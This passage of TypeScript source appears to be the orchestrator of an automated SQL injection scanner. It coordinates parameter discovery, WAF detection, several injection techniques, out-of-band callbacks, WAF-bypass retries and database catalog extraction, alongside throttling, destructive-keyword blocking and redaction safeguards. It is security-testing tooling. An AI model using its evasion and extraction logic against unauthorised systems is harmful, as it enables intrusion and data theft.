import {
  ScanTargetConfig,
  SafetyConfig,
  SqlScanFinding,
  DbmsFingerprint,
  WafDetectionResult,
  ScanLogEntry,
  ScanProgress,
  SqlScanReport,
  CandidateParameter,
  SqlScanEvidence,
  CoverageDimension,
  TestExecutionLogItem,
  RecursiveDatabaseCatalog,
  DiscoveredTable,
  ColumnMetadata,
  DbmsType,
  InvestigationNode,
  InvestigationEdge,
  BeliefEntropyItem,
  AiCopilotReasoningItem,
} from '../../types/sqlScanner';
import { RequestParser, ParsedHttpRequest } from './RequestParser';
import { SafetyController } from './SafetyController';
import { ErrorTester } from './ErrorTester';
import { BooleanTester } from './BooleanTester';
import { TimeBasedTester } from './TimeBasedTester';
import { UnionTester } from './UnionTester';
import { StackedTester } from './StackedTester';
import { SecondOrderTester } from './SecondOrderTester';
import { OobManager } from './OobManager';
import { InteractshClient } from './engine/InteractshClient';
import { ContextDetector } from './ContextDetector';
import { MetadataExtractor } from './MetadataExtractor';
import { DATABASE_ADAPTERS } from './DatabaseAdapters';
import { ConfidenceEngine } from './ConfidenceEngine';
import { WafDetector } from './WafDetector';
import { ReportGenerator } from './ReportGenerator';
import { EvidenceCorrelator } from './EvidenceCorrelator';
import { AdaptivePayloadEngine } from './AdaptivePayloadEngine';
import { ipcClient } from '../../ipc/client';
import { ConcurrentExecutor } from './engine/ConcurrentExecutor';
import { HypothesisEngine } from './engine/HypothesisEngine';
import { CausalVerifier } from './engine/CausalVerifier';
import { MultiplexedProbeEngine } from './engine/MultiplexedProbeEngine';
import { ThreatConsequenceEngine } from './engine/ThreatConsequenceEngine';
import { TernaryMetamorphicVerifier } from './engine/TernaryMetamorphicVerifier';
import { AdaptiveRetryTree } from './engine/AdaptiveRetryTree';
import { SQLDefenseLayerModel } from './engine/SQLDefenseLayerModel';
import { CrossLayerCorrelator } from './engine/CrossLayerCorrelator';
import { InputValidationModel } from './engine/InputValidationModel';
import { DynamicGraphEngine } from './engine/DynamicGraphEngine';
import { MetamorphicStudio } from './engine/MetamorphicStudio';
import { NegativeEvidenceCollector } from './engine/NegativeEvidenceCollector';
import { PolyglotFingerprinter } from './engine/PolyglotFingerprinter';
import { GhostNetwork } from './stealth/GhostNetwork';
import { AdaptiveResponseOracle } from './engine/AdaptiveResponseOracle';
import { BlindDataExtractor } from './engine/BlindDataExtractor';
import { ModuleRegistry } from './modules/ModuleRegistry';
import {
  ScanPipeline,
  ScanContext,
  BaselineProfilingStage,
  WafProfilingStage,
  ParameterContextStage,
  MultiOracleDiscoveryStage,
  CausalVerificationStage,
  GrayBoxStage,
  SecondOrderStage,
  AdaptiveSchemaStage,
  VectorizedExtractionStage,
  EvidenceSynthesisStage,
} from './pipeline';

export type LogCallback = (entry: ScanLogEntry) => void;
export type ProgressCallback = (progress: ScanProgress) => void;
export type FindingCallback = (finding: SqlScanFinding) => void;
export type ExecutionLogCallback = (log: TestExecutionLogItem) => void;
export type CatalogCallback = (catalog: RecursiveDatabaseCatalog) => void;
export type InvestigationNodesCallback = (nodes: InvestigationNode[], edges: InvestigationEdge[]) => void;
export type BeliefUpdateCallback = (data: {
  contextBeliefs: BeliefEntropyItem[];
  dbmsBeliefs: BeliefEntropyItem[];
  shannonEntropy: number;
  confidenceState: string;
}) => void;
export type AiReasoningCallback = (item: AiCopilotReasoningItem) => void;

export class SqlScanOrchestrator {
  private target: ScanTargetConfig;
  private safetyConfig: SafetyConfig;
  private safety: SafetyController;
  private onLog: LogCallback;
  private onProgress: ProgressCallback;
  private onFinding: FindingCallback;
  private onExecutionLog?: ExecutionLogCallback;
  private onCatalog?: CatalogCallback;
  private onInvestigationNodes?: InvestigationNodesCallback;
  private onBeliefUpdate?: BeliefUpdateCallback;
  private onAiReasoning?: AiReasoningCallback;
  private currentInvestigationNodes: InvestigationNode[] = [];
  private currentInvestigationEdges: InvestigationEdge[] = [];

  public engineMode: 'god_rail_v3' | 'autonomous_trigraph' | 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard' = 'god_rail_v3';
  public scanProfile: 'ultra_stealth' | 'fast_triage' | 'deep_forensic' | 'smt_strict' | 'hyper_turbo' = 'deep_forensic';
  public concurrentExecutor: ConcurrentExecutor;
  public defenseLayerModel: SQLDefenseLayerModel = SQLDefenseLayerModel.createDefault();
  public negativeEvidence: NegativeEvidenceCollector = new NegativeEvidenceCollector();

  private isAborted = false;
  private isPaused = false;
  private activeContext: ScanContext | null = null;
  private requestsSent = 0;
  private testsExecuted = 0;
  private startTime = 0;
  private findings: SqlScanFinding[] = [];
  private executionLogs: TestExecutionLogItem[] = [];
  private coverageMap: Map<string, CoverageDimension> = new Map();
  private executedPayloadFingerprints: Set<string> = new Set();

  private dbmsFingerprint: DbmsFingerprint = {
    dbms: 'Unknown',
    confidence: 'Informational',
    confidenceScore: 0,
    evidence: [],
  };
  private wafResult: WafDetectionResult = {
    detected: false,
    confidence: 'Informational',
    evidence: [],
  };
  private catalog: RecursiveDatabaseCatalog = {
    dbms: 'Unknown',
    schemas: [],
    applicationTables: [],
    systemTables: [],
    discoveredAt: Date.now(),
  };

  constructor(
    target: ScanTargetConfig,
    safetyConfig: SafetyConfig,
    callbacks: {
      onLog: LogCallback;
      onProgress: ProgressCallback;
      onFinding: FindingCallback;
      onExecutionLog?: ExecutionLogCallback;
      onCatalog?: CatalogCallback;
      onInvestigationNodes?: InvestigationNodesCallback;
      onBeliefUpdate?: BeliefUpdateCallback;
      onAiReasoning?: AiReasoningCallback;
    },
    engineMode: 'god_rail_v3' | 'autonomous_trigraph' | 'ucmax_causal' | 'bayesian_adaptive' | 'sprt_timing' | 'standard' = 'god_rail_v3',
    concurrencyLimit: number = 10,
    scanProfile: 'ultra_stealth' | 'fast_triage' | 'deep_forensic' | 'smt_strict' | 'hyper_turbo' = 'deep_forensic'
  ) {
    this.target = target;
    this.safetyConfig = safetyConfig;
    this.safety = new SafetyController(safetyConfig);
    this.onLog = callbacks.onLog;
    this.onProgress = callbacks.onProgress;
    this.onFinding = callbacks.onFinding;
    this.onExecutionLog = callbacks.onExecutionLog;
    this.onCatalog = callbacks.onCatalog;
    this.onInvestigationNodes = callbacks.onInvestigationNodes;
    this.onBeliefUpdate = callbacks.onBeliefUpdate;
    this.onAiReasoning = callbacks.onAiReasoning;
    this.engineMode = engineMode;
    this.scanProfile = scanProfile;
    this.concurrentExecutor = new ConcurrentExecutor(concurrencyLimit, 100);

    this.initCoverageDimensions();
  }

  private initCoverageDimensions(): void {
    const dims: CoverageDimension[] = [
      { key: 'param_discovery', name: 'Parameter Discovery', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'context_detection', name: 'Context Detection', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'error_sqli', name: 'Error-Based SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'boolean_sqli', name: 'Boolean-Based SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'time_sqli', name: 'Time-Based Blind SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'union_sqli', name: 'UNION-Based SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'order_by', name: 'ORDER BY Column Discovery', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'stacked_sqli', name: 'Stacked Query SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'second_order', name: 'Second-Order SQLi', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'oob_sqli', name: 'Out-of-Band (OAST)', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'fingerprinting', name: 'DBMS Fingerprinting', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'version_detection', name: 'Version Detection', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'metadata_analysis', name: 'Metadata & Schema Analysis', status: 'pending', testedCount: 0, positiveCount: 0 },
      { key: 'waf_analysis', name: 'WAF & Filter Analysis', status: 'pending', testedCount: 0, positiveCount: 0 },
    ];
    for (const d of dims) {
      this.coverageMap.set(d.key, d);
    }
  }

  private updateCoverage(key: string, updates: Partial<CoverageDimension>): void {
    const curr = this.coverageMap.get(key);
    if (curr) {
      this.coverageMap.set(key, { ...curr, ...updates });
    }
  }

  public abort(): void {
    this.isAborted = true;
    this.concurrentExecutor.abort();
    if (this.activeContext) {
      this.activeContext.abort();
    }
    this.log('warn', 'aborted', 'Scan abort requested by operator. Terminating testing threads...');
  }

  public pause(): void {
    this.isPaused = true;
    this.activeContext?.pause();
    this.log('info', 'paused', 'Scan paused by operator.');
  }

  public resume(): void {
    this.isPaused = false;
    this.activeContext?.resume();
    this.log('info', 'resumed', 'Scan resumed.');
  }

  public getIsAborted(): boolean {
    return this.isAborted;
  }

  private async waitIfPaused(): Promise<void> {
    while (this.isPaused && !this.isAborted) {
      await new Promise((r) => setTimeout(r, 200));
    }
  }

  private log(
    level: 'info' | 'warn' | 'error' | 'success' | 'probe',
    phase: string,
    message: string,
    details?: string,
    payload?: string,
    targetParameter?: string
  ): void {
    const entry: ScanLogEntry = {
      id: `log_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      timestamp: Date.now(),
      level,
      phase,
      message,
      details,
      payload,
      targetParameter,
    };
    this.onLog(entry);
  }

  private logExecution(
    paramName: string,
    technique: string,
    context: string,
    payload: string,
    status: 'positive' | 'negative' | 'error' | 'timeout' | 'skipped' | 'passed',
    durationMs: number,
    evidenceSnippet?: string,
    rawRequest?: string,
    rawResponse?: string
  ): void {
    this.testsExecuted++;
    const item: TestExecutionLogItem = {
      id: `tlog_${Date.now()}_${this.testsExecuted}`,
      testIndex: this.testsExecuted,
      parameterName: paramName,
      technique,
      context,
      dbms: this.dbmsFingerprint.dbms,
      payload,
      status,
      evidenceSnippet,
      durationMs,
      timestamp: Date.now(),
      rawRequest,
      rawResponse,
    };
    this.executionLogs.push(item);
    if (this.onExecutionLog) {
      this.onExecutionLog(item);
    }
  }

  private emitProgressiveCatalog(
    appNames: string[],
    sysNames: string[],
    injectableParam: CandidateParameter | null,
    columnCount: number,
    renderColumn: number
  ): void {
    const appTables: DiscoveredTable[] = appNames.map((tName) => {
      const sensitivity = MetadataExtractor.isSensitiveName(tName);
      return {
        id: `tbl_${tName}`, name: tName, classification: 'application' as const,
        columns: [], isSensitive: sensitivity.isSensitive, sensitivityReason: sensitivity.reason,
        discoveredAt: Date.now(), status: 'discovered' as const,
      };
    });
    const sysTables: DiscoveredTable[] = sysNames.map((tName) => ({
      id: `tbl_${tName}`, name: tName, classification: 'system' as const,
      columns: [], isSensitive: false, discoveredAt: Date.now(), status: 'discovered' as const,
    }));
    this.catalog = {
      dbms: this.dbmsFingerprint.dbms,
      version: this.dbmsFingerprint.version,
      columnCount, renderColumn,
      injectableParamName: injectableParam?.name,
      schemas: [{ name: 'CURRENT_SCHEMA', classification: 'application', tables: appTables, views: [], isExpanded: true, discoveredAt: Date.now() }],
      applicationTables: appTables,
      systemTables: sysTables,
      discoveredAt: Date.now(),
    };
    if (this.onCatalog) this.onCatalog(this.catalog);
  }

  private updateProgress(phase: any, phaseLabel: string, percent: number, currentParam?: string, totalParams = 1, testedParams = 0): void {
    const progress: ScanProgress = {
      phase,
      phaseLabel,
      totalParameters: totalParams,
      testedParameters: testedParams,
      currentParameter: currentParam,
      requestsSent: this.requestsSent,
      testsExecuted: this.testsExecuted,
      findingsCount: this.findings.length,
      confirmedIndicators: this.findings.reduce((a, f) => a + f.evidence.length, 0),
      percent: Math.min(100, Math.max(0, percent)),
      startTime: this.startTime,
      durationMs: Date.now() - this.startTime,
      isPaused: this.isPaused,
      isAborted: this.isAborted,
    };
    this.onProgress(progress);
  }

  /**
   * Dispatches an HTTP request through the Sentinel network engine
   */
  public async executeProbe(
    parsed: ParsedHttpRequest,
    param: CandidateParameter | null,
    payload: string,
    append = false
  ): Promise<{ status: number; body: string; headers: { name: string; value: string }[]; durationMs: number; rawRequest: string; rawResponse: string }> {
    await this.waitIfPaused();
    if (this.isAborted) {
      throw new Error('Scan aborted by user');
    }

    // Deduplication check
    const fp = `${param?.id || 'base'}_${payload}`;
    this.executedPayloadFingerprints.add(fp);

    try {
      this.safety.validateProbe(payload);
    } catch (e: any) {
      if (e.message && e.message.includes('Destructive SQL keyword detected')) {
        this.log('info', 'safety', `Probe skipped by non-destructive policy: ${payload.substring(0, 30)}...`);
        return { status: 0, body: '', headers: [], durationMs: 0, rawRequest: '', rawResponse: '' };
      }
      this.isAborted = true;
      throw e;
    }
    await this.safety.throttle();

    let reqData: { rawRequest: string; targetUrl: string; bodyText: string; headers: { name: string; value: string }[] };
    if (param) {
      reqData = RequestParser.injectPayload(parsed, param, payload, append);
    } else {
      reqData = {
        rawRequest: parsed.body ? `${parsed.method} ${parsed.path} ${parsed.protocol}\r\n${parsed.headers.map((h) => `${h.name}: ${h.value}`).join('\r\n')}\r\n\r\n${parsed.body}` : `${parsed.method} ${parsed.path} ${parsed.protocol}\r\n${parsed.headers.map((h) => `${h.name}: ${h.value}`).join('\r\n')}\r\n\r\n`,
        targetUrl: parsed.url,
        bodyText: parsed.body,
        headers: parsed.headers,
      };
    }

    const tStart = Date.now();
    try {
      let execResult: any = null;
      let lastErr: any = null;
      const maxRetries = 2;

      for (let attempt = 0; attempt <= maxRetries; attempt++) {
        if (this.isAborted) {
          throw new Error('Scan aborted by user');
        }
        try {
          execResult = await ipcClient.sendRepeaterRequest({
            tabId: 'sql_scanner_probe',
            targetUrl: reqData.targetUrl,
            rawRequest: reqData.rawRequest,
          });
          if (this.isAborted) {
            throw new Error('Scan aborted by user');
          }
          if (execResult && execResult.statusCode && execResult.statusCode > 0) {
            break;
          }
        } catch (err: any) {
          if (this.isAborted || err?.message?.includes('aborted')) {
            throw new Error('Scan aborted by user');
          }
          lastErr = err;
          if (attempt < maxRetries) {
            await new Promise((r) => setTimeout(r, 150 * (attempt + 1) + Math.random() * 50));
            continue;
          }
        }
      }

      if (this.isAborted) {
        throw new Error('Scan aborted by user');
      }

      if (!execResult && lastErr) {
        throw lastErr;
      }
      if (!execResult) {
        throw new Error('Null response received from network bridge');
      }

      this.requestsSent++;
      this.safety.recordResponseSuccess();

      let durationMs = execResult.durationMs || (Date.now() - tStart);
      let statusCode = execResult.statusCode || 200;
      this.safety.recordResponseMetrics(statusCode, durationMs);
      let rawResBody = execResult.body || '';

      // Frontier Resilience & Adaptive Retry Tree:
      // If probe was blocked by WAF, rejected by schema, or filtered, branch dynamically
      if ((statusCode === 403 || statusCode === 406 || statusCode === 400 || statusCode === 422) && payload && param) {
        const headerMap: Record<string, string> = {};
        if (execResult.headers) {
          execResult.headers.forEach((h: { name: string; value: string }) => {
            headerMap[h.name.toLowerCase()] = h.value;
          });
        }
        const decision = AdaptiveRetryTree.evaluateAndBranch(
          payload,
          param,
          this.dbmsFingerprint.dbms,
          param.detectedContext || 'single_quote_string',
          statusCode,
          headerMap,
          rawResBody,
          this.defenseLayerModel
        );

        if (decision.action !== 'PROCEED_SQL_ANALYSIS' && decision.action !== 'HALT_UNREACHABLE') {
          this.log('info', 'waf', `[Adaptive Retry Tree] ${decision.reason}`, undefined, decision.wirePayload, param.name);
          const retryReqData = RequestParser.injectPayload(parsed, param, decision.wirePayload, append);
          const retryResult = await ipcClient.sendRepeaterRequest({
            tabId: 'sql_scanner_adaptive_resilience',
            targetUrl: retryReqData.targetUrl,
            rawRequest: retryReqData.rawRequest,
          });
          this.requestsSent++;
          this.safety.recordResponseMetrics(retryResult.statusCode || 200, retryResult.durationMs || 50);
          const retryHeaderMap: Record<string, string> = {};
          if (retryResult.headers) {
            retryResult.headers.forEach((h: { name: string; value: string }) => {
              retryHeaderMap[h.name.toLowerCase()] = h.value;
            });
          }
          const retryBoundary = InputValidationModel.classifyBoundary(
            retryResult.statusCode || 0,
            retryHeaderMap,
            retryResult.body || ''
          );
          const isRetryStillBlocked = retryBoundary.boundary === 'WAF_PERIMETER_BLOCKED';
          if (retryResult.statusCode && !isRetryStillBlocked) {
            this.log('success', 'waf', `Adaptive resilience succeeded: Bypassed boundary filter via ${decision.transformationId}`, undefined, decision.wirePayload, param.name);
            execResult = retryResult;
            statusCode = retryResult.statusCode;
            rawResBody = retryResult.body || '';
            reqData = retryReqData;
          }
        }
      }

      // Continuous 8-Layer Defense & Processing Correlation
      if (param && payload) {
        const headerMap: Record<string, string> = {};
        if (execResult.headers) {
          execResult.headers.forEach((h: { name: string; value: string }) => {
            headerMap[h.name.toLowerCase()] = h.value;
          });
        }
        CrossLayerCorrelator.evaluateProbe(
          param,
          payload,
          statusCode,
          headerMap,
          rawResBody,
          durationMs,
          this.defenseLayerModel,
          this.dbmsFingerprint.dbms
        );
      }

      // Synchronize dynamic Set-Cookie headers for continuous authenticated session health
      if (execResult.headers) {
        const setCookieHeaders = execResult.headers.filter((h: { name: string; value: string }) => h.name.toLowerCase() === 'set-cookie');
        if (setCookieHeaders.length > 0) {
          setCookieHeaders.forEach((sc: { name: string; value: string }) => {
            const cookieVal = sc.value.split(';')[0];
            if (cookieVal) {
              const [cName, cVal] = cookieVal.split('=');
              if (cName && cVal) {
                const existingCookieHdr = parsed.headers.find((h) => h.name.toLowerCase() === 'cookie');
                if (existingCookieHdr) {
                  if (existingCookieHdr.value.includes(`${cName.trim()}=`)) {
                    existingCookieHdr.value = existingCookieHdr.value.replace(
                      new RegExp(`${cName.trim()}=[^;]+`),
                      `${cName.trim()}=${cVal.trim()}`
                    );
                  } else {
                    existingCookieHdr.value += `; ${cName.trim()}=${cVal.trim()}`;
                  }
                }
              }
            }
          });
        }
      }

      const sanitizedBody = this.safety.redactSensitiveOutput(rawResBody);
      const sanitizedRawRes = this.safety.redactSensitiveOutput(execResult.rawResponse || `HTTP/1.1 ${statusCode}\r\n\r\n${sanitizedBody}`);

      return {
        status: statusCode,
        body: sanitizedBody,
        headers: (execResult.headers || []).map((h: { name: string; value: string }) => ({ name: h.name, value: h.value })),
        durationMs,
        rawRequest: reqData.rawRequest,
        rawResponse: sanitizedRawRes,
      };
    } catch (err: any) {
      if (this.isAborted || err?.message?.includes('aborted')) {
        throw err;
      }
      this.requestsSent++;
      this.safety.recordResponseError();
      const durationMs = Date.now() - tStart;
      this.safety.recordResponseMetrics(0, durationMs);
      this.log('error', 'probe', `Probe network transmission failed: ${err?.message || err}`, undefined, payload, param?.name);
      return {
        status: 0,
        body: '',
        headers: [],
        durationMs,
        rawRequest: reqData.rawRequest,
        rawResponse: `HTTP/1.1 0 Connection Error\r\n\r\n${err?.message || 'Socket error'}`,
      };
    }
  }

  /**
   * Hard-gated 3x reproduction verification loop before confirming any vulnerability
   */
  private async verifyReproduction(
    parsed: ParsedHttpRequest,
    param: CandidateParameter,
    payload: string,
    checkFn: (res: { status: number; body: string; durationMs: number }) => boolean
  ): Promise<{ success: boolean; successRate: string }> {
    let positiveCount = 0;
    const totalTries = 3;

    for (let t = 0; t < totalTries; t++) {
      if (this.isAborted) break;
      const res = await this.executeProbe(parsed, param, payload, true);
      if (checkFn(res)) {
        positiveCount++;
      }
    }

    return {
      success: positiveCount === totalTries,
      successRate: `${positiveCount}/${totalTries}`,
    };
  }

  private emitHypothesisTelemetry(hypothesis: HypothesisEngine, _param: CandidateParameter) {
    const belief = hypothesis.getBeliefState();
    const contextBeliefs: BeliefEntropyItem[] = Object.entries(belief.contextBeliefs)
      .map(([name, prob]) => ({
        name,
        probability: prob,
        shannonBits: prob > 0 ? -prob * Math.log2(prob) : 0,
        isLeading: name === belief.mostLikelyContext,
      }))
      .sort((a, b) => b.probability - a.probability)
      .slice(0, 5);

    if (contextBeliefs.length > 0 && !contextBeliefs.some((c) => c.isLeading)) {
      contextBeliefs[0].isLeading = true;
    }

    const dbmsBeliefs: BeliefEntropyItem[] = Object.entries(belief.dbmsBeliefs)
      .map(([name, prob]) => ({
        name,
        probability: prob,
        shannonBits: prob > 0 ? -prob * Math.log2(prob) : 0,
        isLeading: name === belief.mostLikelyDbms,
      }))
      .sort((a, b) => b.probability - a.probability)
      .slice(0, 5);

    if (dbmsBeliefs.length > 0 && !dbmsBeliefs.some((d) => d.isLeading)) {
      dbmsBeliefs[0].isLeading = true;
    }

    this.onBeliefUpdate?.({
      contextBeliefs,
      dbmsBeliefs,
      shannonEntropy: belief.contextEntropy,
      confidenceState: belief.confidenceTier === 'Confirmed'
        ? `Confirmed ${(belief.vulnerabilityProbability * 100).toFixed(0)}% Posterior`
        : belief.confidenceTier === 'High'
        ? `High ${(belief.vulnerabilityProbability * 100).toFixed(0)}% Posterior`
        : `Evaluating (${(belief.vulnerabilityProbability * 100).toFixed(0)}%)`,
    });
  }

  /**
   * Executes the modular 8-stage Apex Sovereign Autonomous Pipeline
   */
  public async runApexPipeline(): Promise<SqlScanReport> {
    const ctx = new ScanContext({
      target: this.target,
      safetyConfig: this.safetyConfig,
      onLog: (l) => {
        if (!this.isAborted) this.onLog(l);
      },
      onProgress: (p) => {
        if (!this.isAborted) this.onProgress(p);
      },
      onFinding: (f) => {
        if (this.isAborted) return;
        const exists = this.findings.find((x) => x.parameterName === f.parameterName && x.injectionType === f.injectionType);
        if (!exists) {
          this.findings.push(f);
          this.onFinding(f);
        }
      },
      onExecutionLog: (log) => {
        if (!this.isAborted) this.onExecutionLog?.(log);
      },
      onCatalog: (cat) => {
        if (!this.isAborted) {
          this.catalog = cat;
          this.onCatalog?.(cat);
        }
      },
      onInvestigationNodes: (nodes, edges) => {
        if (!this.isAborted) this.onInvestigationNodes?.(nodes, edges);
      },
      onBeliefUpdate: (data) => {
        if (!this.isAborted) this.onBeliefUpdate?.(data);
      },
      onAiReasoning: (reasoning) => {
        if (!this.isAborted) this.onAiReasoning?.(reasoning);
      },
      engineMode: this.engineMode,
      scanProfile: this.scanProfile,
      concurrencyLimit: this.concurrentExecutor.getConcurrency(),
      concurrentExecutor: this.concurrentExecutor,
    });

    if (this.isAborted) {
      ctx.abort();
    }
    if (this.isPaused) {
      ctx.pause();
    }
    this.activeContext = ctx;

    try {
      const pipeline = new ScanPipeline();
      pipeline
        .addStage(new BaselineProfilingStage())
        .addStage(new WafProfilingStage())
        .addStage(new ParameterContextStage())
        .addStage(new MultiOracleDiscoveryStage())
        .addStage(new CausalVerificationStage())
        .addStage(new GrayBoxStage())
        .addStage(new SecondOrderStage())
        .addStage(new AdaptiveSchemaStage())
        .addStage(new VectorizedExtractionStage())
        .addStage(new EvidenceSynthesisStage());

      const report = await pipeline.execute(ctx);
      this.findings = report.findings;
      this.catalog = report.catalog;
      this.dbmsFingerprint = report.dbms;
      this.wafResult = report.waf;
      return report;
    } finally {
      this.activeContext = null;
    }
  }

  /**
   * Main scan execution entrypoint
   */
  public async startScan(): Promise<SqlScanReport> {
    if ((this.engineMode as string) === 'god_rail_v3') {
      return this.runApexPipeline();
    }

    this.startTime = Date.now();
    this.isAborted = false;
    this.isPaused = false;
    this.requestsSent = 0;
    this.testsExecuted = 0;
    this.findings = [];
    this.executionLogs = [];
    this.executedPayloadFingerprints.clear();
    this.initCoverageDimensions();

    this.log('info', 'authorizing', 'Initiating Sentinel SQL X Security Assessment Engine...');
    this.safety.initScan();

    // Initialize Dynamic Tri-Graph DAG, Bayesian priors, and AI Telemetry
    const initialTelemetry = DynamicGraphEngine.generateForRequest(this.target.rawRequest, this.target.url);
    this.currentInvestigationNodes = initialTelemetry.investigationNodes;
    this.currentInvestigationEdges = initialTelemetry.investigationEdges;
    this.onInvestigationNodes?.(this.currentInvestigationNodes, this.currentInvestigationEdges);
    this.onBeliefUpdate?.({
      contextBeliefs: initialTelemetry.contextBeliefs,
      dbmsBeliefs: initialTelemetry.dbmsBeliefs,
      shannonEntropy: initialTelemetry.shannonEntropy,
      confidenceState: 'Probing in Progress',
    });
    for (const r of initialTelemetry.aiReasoningLogs) {
      this.onAiReasoning?.(r);
    }

    // 1. Parse Request & Candidate Parameters
    this.updateProgress('parsing', 'Parsing HTTP Request & Candidate Vectors', 5);
    const parsed = RequestParser.parse(this.target.rawRequest, this.target.url);
    const disabledIds = new Set(this.target.parameters.filter((p) => !p.enabled).map((p) => p.id));
    let enabledParams = parsed.parameters
      .map((p) => ({ ...p, enabled: !disabledIds.has(p.id) }))
      .filter((p) => p.enabled);

    if (enabledParams.length === 0 && parsed.parameters.length > 0) {
      enabledParams = parsed.parameters.map((p) => ({ ...p, enabled: true }));
    }

    this.updateCoverage('param_discovery', {
      status: enabledParams.length > 0 ? 'passed' : 'skipped',
      testedCount: enabledParams.length,
      positiveCount: enabledParams.length,
    });

    if (enabledParams.length === 0) {
      this.log('warn', 'parsing', 'No candidate parameters found in target request.');
    } else {
      this.log(
        'info',
        'parsing',
        `Discovered ${enabledParams.length} candidate parameter(s) across query/body/headers/cookies/path for active testing.`,
        enabledParams.map((p) => `${p.name} (${p.location})`).join(', ')
      );
    }

    // 2. Context Detection
    this.updateProgress('context_detection', 'Detecting Parameter SQL Injection Contexts', 8);
    for (const p of enabledParams) {
      p.detectedContext = ContextDetector.detectContext(p, this.target.rawRequest);
      this.log('info', 'context_detection', `Parameter "${p.name}": Detected context [${p.detectedContext}]`);
    }
    this.updateCoverage('context_detection', { status: 'passed', testedCount: enabledParams.length, positiveCount: enabledParams.length });

    // Auto-Initialize OAST Client for Out-of-Band Blind Callback Detection
    try {
      const oastClient = InteractshClient.getInstance();
      await oastClient.initialize(this.target.oobConfig?.providerUrl);
      const session = oastClient.getSession();
      if (session) {
        this.log('info', 'baseline', `OAST Callback Listener active: ${session.domain} (${session.isOffline ? 'local/mock mode' : 'live interactsh'})`);
      }
    } catch {
      // Non-blocking fallback
    }

    // 3. Multi-Sample Baseline Traffic (Mean, Median, Standard Deviation)
    this.updateProgress('baseline', 'Capturing Multi-Sample Baseline Traffic & Measuring Jitter', 10);
    this.log('info', 'baseline', `Establishing target baseline responses against ${parsed.url}...`);

    const baseline1 = await this.executeProbe(parsed, null, '');
    const baseline2 = await this.executeProbe(parsed, null, '');
    const baseline3 = await this.executeProbe(parsed, null, '');
    const baselineDurations = [baseline1.durationMs, baseline2.durationMs, baseline3.durationMs];
    const timingStats = TimeBasedTester.computeTimingStats(baselineDurations);
    const baselineBody = baseline1.body || baseline2.body;
    const baselineStatus = baseline1.status || baseline2.status;

    this.log(
      'info',
      'baseline',
      `Baseline established: HTTP ${baselineStatus}, Length: ${baselineBody.length}B, Mean latency: ${timingStats.mean.toFixed(0)}ms (σ = ${timingStats.stdDev.toFixed(1)}ms)`
    );

    this.onAiReasoning?.({
      id: `ai-baseline-${Date.now()}`,
      timestamp: Date.now(),
      hypothesis: `Baseline Latency & Ingress: Mean ${timingStats.mean.toFixed(0)}ms (σ = ${timingStats.stdDev.toFixed(1)}ms)`,
      reasoning: `Baseline response established: HTTP ${baselineStatus}, ${baselineBody.length}B payload. Wald SPRT bounds initialized for statistical timing discrimination.`,
      suggestedAction: 'Inspect defensive perimeter and evaluate parameter serialization boundaries.',
      confidenceScore: 0.5,
    });

    // 4. WAF & Defensive Filter Detection
    this.updateProgress('waf_check', 'Detecting Web Application Firewall (WAF)', 14);
    const requestWafAnalysis = MetamorphicStudio.detectWafFromRequest(this.target.rawRequest, this.target.url);
    this.wafResult = WafDetector.inspect(baseline1.headers, baselineBody, baselineStatus);
    if (!this.wafResult.detected && requestWafAnalysis.detectedWaf !== 'generic') {
      this.wafResult = {
        detected: true,
        wafName: requestWafAnalysis.wafDisplayName,
        confidence: requestWafAnalysis.confidence >= 80 ? 'High' : 'Medium',
        evidence: requestWafAnalysis.reasons,
      };
    }

    if (this.wafResult.detected) {
      this.log('warn', 'waf_check', `Defensive layer detected: ${this.wafResult.wafName} (${this.wafResult.confidence} confidence)`, this.wafResult.evidence.join('; '));
      if (requestWafAnalysis.recommendedTransforms.length > 0) {
        this.log('info', 'waf_check', `Armed ${requestWafAnalysis.recommendedTransforms.length} metamorphic bypass transforms: ${requestWafAnalysis.recommendedTransforms.join(', ')}`);
      }
      this.onAiReasoning?.({
        id: `ai-waf-${Date.now()}`,
        timestamp: Date.now(),
        hypothesis: `L1 Perimeter Defense: ${this.wafResult.wafName} Active`,
        reasoning: `Active firewall signatures detected (${this.wafResult.confidence} confidence): ${this.wafResult.evidence.join('; ')}. Activating automated AST-safe encoding & evasion transformations.`,
        suggestedAction: 'Route subsequent injection probes through automated XML entity and evasion filters.',
        confidenceScore: 0.85,
      });
    } else {
      this.log('info', 'waf_check', 'No defensive WAF block signatures detected on baseline response.');
      this.onAiReasoning?.({
        id: `ai-waf-${Date.now()}`,
        timestamp: Date.now(),
        hypothesis: `L1 Perimeter Defense: Direct Connection (No Perimeter Block Observed)`,
        reasoning: `No active defensive reset or filtering headers observed on baseline probes. Target appears directly accessible.`,
        suggestedAction: 'Proceed to candidate parameter context probing.',
        confidenceScore: 0.70,
      });
    }
    this.updateCoverage('waf_analysis', {
      status: this.wafResult.detected ? 'vulnerable' : 'passed',
      testedCount: 1,
      positiveCount: this.wafResult.detected ? 1 : 0,
      reason: this.wafResult.detected ? `WAF Active: ${this.wafResult.wafName}` : 'Direct connection',
    });

    // 5. Test Each Candidate Parameter Individually
    const totalParams = enabledParams.length;
    let testedCount = 0;
    let confirmedRenderColumn = 1;
    let confirmedColumnCount = 0;
    let confirmedInjectableParam: CandidateParameter | null = null;
    let confirmedTrueMarker = '';
    let confirmedConditionalError = false;
    let confirmedConditionalPolarity: 'error_on_true' | 'error_on_false' | 'normal' = 'normal';
    let confirmedQuoteStyle: 'balanced' | 'commented' | 'concatenation' = 'balanced';

    for (const param of enabledParams) {
      if (this.isAborted) break;

      testedCount++;
      const basePercent = 18 + Math.round((testedCount / (totalParams || 1)) * 55);

